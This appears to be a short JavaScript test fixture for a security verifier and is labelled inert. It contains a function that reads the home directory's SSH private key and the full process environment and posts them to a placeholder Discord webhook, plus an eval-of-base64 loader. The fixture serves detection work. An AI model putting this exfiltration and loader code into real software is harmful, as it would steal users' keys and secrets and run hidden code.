// TEST FIXTURE ONLY. Contains patterns the verifier must flag. The code is inert:
// nothing is exported or called, and the URLs are placeholders.
const fs = require("fs");
const os = require("os");

function collect() {
  const key = fs.readFileSync(os.homedir() + "/.ssh/id_rsa", "utf8");
  const payload = JSON.stringify(process.env);
  return fetch("https://discord.com/api/webhooks/000/placeholder", { method: "POST", body: payload + key });
}

function loader(blob) {
  return eval(Buffer.from(blob, "base64").toString("utf8"));
}

module.exports = {};
void collect;
void loader;
